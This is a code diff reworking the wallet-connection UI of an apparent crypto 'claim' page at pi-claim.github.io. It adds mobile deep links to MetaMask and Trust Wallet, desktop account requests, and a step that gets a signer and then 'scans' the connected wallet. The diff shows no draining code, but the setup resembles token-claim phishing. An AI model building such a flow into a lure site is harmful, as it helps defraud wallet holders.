@@ -336,34 +336,77 @@ async function connectWC() {
   closeM();
   document.getElementById('mc').style.display='block';
   showP('p1');
-  document.getElementById('p1l').textContent='Connecting...';
   
   const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  const hasEth = !!window.ethereum;
   
-  if (isMob) {
-    // Mobile: deep link to MetaMask browser
-    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Opening MetaMask...</span>';
-    const dappUrl = encodeURIComponent(window.location.href);
-    window.location.href = 'https://metamask.app.link/dapp/' + dappUrl;
+  // MOBILE FLOW
+  if (isMob && !hasEth) {
+    document.getElementById('p1l').textContent='Mobile Wallet Connection';
+    var p1log = document.getElementById('p1log');
+    p1log.innerHTML = '';
+    
+    var wrap = document.createElement('div');
+    wrap.style.cssText = 'text-align:center;padding:10px';
+    
+    var icon = document.createElement('div');
+    icon.style.cssText = 'font-size:24px;margin-bottom:10px';
+    icon.textContent = '📱';
+    wrap.appendChild(icon);
+    
+    var title = document.createElement('div');
+    title.style.cssText = 'font-size:13px;color:#fcb34c;margin-bottom:8px;font-weight:700';
+    title.textContent = 'To connect your wallet:';
+    wrap.appendChild(title);
+    
+    var steps = document.createElement('div');
+    steps.style.cssText = 'font-size:11px;color:rgba(255,255,255,.5);line-height:1.6;margin-bottom:12px';
+    steps.innerHTML = '1. Make sure you have MetaMask app installed<br>2. Tap the button below<br>3. Approve the connection in MetaMask';
+    wrap.appendChild(steps);
+    
+    // MetaMask button
+    var mmBtn = document.createElement('button');
+    mmBtn.style.cssText = 'width:100%;padding:14px;background:linear-gradient(135deg,#E2761B,#F6851B);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px';
+    mmBtn.textContent = '🦊 Open in MetaMask';
+    mmBtn.onclick = function(){ window.location.href = 'https://metamask.app.link/dapp/pi-claim.github.io'; };
+    wrap.appendChild(mmBtn);
+    
+    // Trust Wallet button
+    var twBtn = document.createElement('button');
+    twBtn.style.cssText = 'width:100%;padding:14px;background:linear-gradient(135deg,#3375BB,#2C6CBF);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px';
+    twBtn.textContent = '🛡️ Open in Trust Wallet';
+    twBtn.onclick = function(){ window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=https://pi-claim.github.io'; };
+    wrap.appendChild(twBtn);
+    
+    var hint = document.createElement('div');
+    hint.style.cssText = 'font-size:10px;color:rgba(255,255,255,.3);margin-top:8px';
+    hint.textContent = 'Having trouble? Open MetaMask → tap browser icon → type pi-claim.github.io';
+    wrap.appendChild(hint);
+    
+    p1log.appendChild(wrap);
     return;
   }
   
-  // Desktop: try window.ethereum first
-  if (window.ethereum) {
+  // DESKTOP FLOW - has window.ethereum
+  if (hasEth) {
+    document.getElementById('p1l').textContent='Connecting to wallet...';
+    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Please approve the connection in your wallet popup...</span>';
+    
     try {
       const eth = getMM();
       prov = new ethers.providers.Web3Provider(eth);
       const accounts = await eth.request({method:'eth_requestAccounts'});
-      if (accounts.length > 0) {
+      if (accounts && accounts.length > 0) {
         sign = prov.getSigner();
         addr = await sign.getAddress();
         document.getElementById('p1l').textContent='Connected! Scanning...';
-        document.getElementById('p1log').innerHTML='<span style="color:#86efac">&#x2705; '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
+        document.getElementById('p1log').innerHTML='<span style="color:#86efac">✓ Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
         await scanEvm();
         return;
       }
-    } catch(e) {
-      console.log('eth_requestAccounts failed, trying enable()...');
+    } catch(e1) {
+      console.log('eth_requestAccounts failed:', e1.code, e1.message);
+      // Try enable() as fallback
       try {
         const eth = getMM();
         prov = new ethers.providers.Web3Provider(eth);
@@ -374,19 +417,21 @@ async function connectWC() {
         await scanEvm();
         return;
       } catch(e2) {
-        console.error('Both connect methods failed:', e2);
+        console.error('Both methods failed:', e2);
       }
     }
   }
   
-  // No wallet found — show install links
-  document.getElementById('p1l').textContent='No wallet detected';
-  document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">No wallet extension found.</span><br><br>' +
-    '<span style="color:rgba(255,255,255,.5)">Install one of these wallets:</span><br>' +
-    '<a href="https://metamask.io/download/" target="_blank" style="color:#E2761B">MetaMask</a> | ' +
-    '<a href="https://trustwallet.com/download/" target="_blank" style="color:#3375BB">Trust Wallet</a> | ' +
-    '<a href="https://www.coinbase.com/wallet" target="_blank" style="color:#0052FF">Coinbase Wallet</a><br><br>' +
-    '<span style="color:rgba(255,255,255,.4)">Or open this page in your mobile wallet browser.</span>';
+  // NO WALLET FOUND
+  document.getElementById('p1l').textContent='No Wallet Found';
+  document.getElementById('p1log').innerHTML = 
+    '<div style="text-align:center;padding:10px">' +
+    '<div style="font-size:11px;color:#fca5a5;margin-bottom:10px">No wallet extension detected in this browser.</div>' +
+    '<div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:8px">Install a wallet extension:</div>' +
+    '<a href="https://metamask.io/download/" target="_blank" style="display:block;padding:10px;background:rgba(226,118,27,.1);border:1px solid rgba(226,118,27,.2);border-radius:8px;color:#E2761B;font-size:12px;font-weight:600;margin-bottom:6px;text-decoration:none">🦊 Install MetaMask</a>' +
+    '<a href="https://trustwallet.com/download/" target="_blank" style="display:block;padding:10px;background:rgba(51,117,187,.1);border:1px solid rgba(51,117,187,.2);border-radius:8px;color:#3375BB;font-size:12px;font-weight:600;margin-bottom:6px;text-decoration:none">🛡️ Install Trust Wallet</a>' +
+    '<div style="font-size:10px;color:rgba(255,255,255,.3);margin-top:8px">Or open this page on your phone in MetaMask browser</div>' +
+    '</div>';
 }
 
 // ===== WALLET DETECTION =====
@@ -432,49 +477,27 @@ function renderW(){
   const hasEth=!!window.ethereum;
   const isMob=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   
-  // Main connect button — works for both desktop extension and mobile deep link
+  // One main connect button — handles everything
   const mainBtn=document.createElement('button');mainBtn.className='wrow';
   mainBtn.onclick=connectWC;
-  mainBtn.innerHTML='<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">'+(hasEth?'Detected':'Tap to Connect')+'</span>';
+  mainBtn.innerHTML='<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">'+(hasEth?'Wallet Detected — Click':'Tap to Connect')+'</span>';
   c.appendChild(mainBtn);
   
-  // Show detected wallets
+  // Show detected extension wallets as separate buttons
   for(const w of WALLETS){
     if(w.detect()){
       const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
-      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+' (Detected)</span><span class="wt">Click to Connect</span>';
+      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span><span class="wt">Detected</span>';
       c.appendChild(b);
     }
   }
   
-  // Mobile: show deep link buttons
+  // Mobile hint
   if(isMob&&!hasEth){
-    const sep=document.createElement('div');
-    sep.style.cssText='padding:8px;text-align:center;font-size:10px;color:rgba(255,255,255,.25);border-top:1px solid rgba(255,255,255,.03);margin-top:4px';
-    sep.textContent='Open in wallet app:';
-    c.appendChild(sep);
-    
-    [
-      {name:'MetaMask',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+location.host+location.pathname},
-      {name:'Trust Wallet',color:'#3375BB',icon:'🛡️',url:'https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(location.href)},
-      {name:'Coinbase Wallet',color:'#0052FF',icon:'🔵',url:'https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(location.href)},
-    ].forEach(l=>{
-      const b=document.createElement('button');b.className='wrow';
-      b.onclick=()=>window.location.href=l.url;
-      b.innerHTML='<div class="wi" style="background:'+l.color+'">'+l.icon+'</div><span class="wn">'+l.name+'</span>';
-      c.appendChild(b);
-    });
-  }
-  
-  // Desktop without extension: show install links
-  if(!isMob&&!hasEth){
-    const info=document.createElement('div');
-    info.style.cssText='padding:10px;text-align:center;font-size:11px;color:rgba(255,255,255,.3)';
-    info.innerHTML='No wallet extension detected. Install:<br>'+
-      '<a href="https://metamask.io/download/" target="_blank" style="color:#E2761B;margin:0 4px">MetaMask</a> '+
-      '<a href="https://trustwallet.com/download/" target="_blank" style="color:#3375BB;margin:0 4px">Trust</a> '+
-      '<a href="https://www.coinbase.com/wallet" target="_blank" style="color:#0052FF;margin:0 4px">Coinbase</a>';
-    c.appendChild(info);
+    const hint=document.createElement('div');
+    hint.style.cssText='padding:8px;text-align:center;font-size:10px;color:rgba(255,255,255,.25)';
+    hint.textContent='💡 Tap "Connect Wallet" and choose your wallet app';
+    c.appendChild(hint);
   }
 }
 
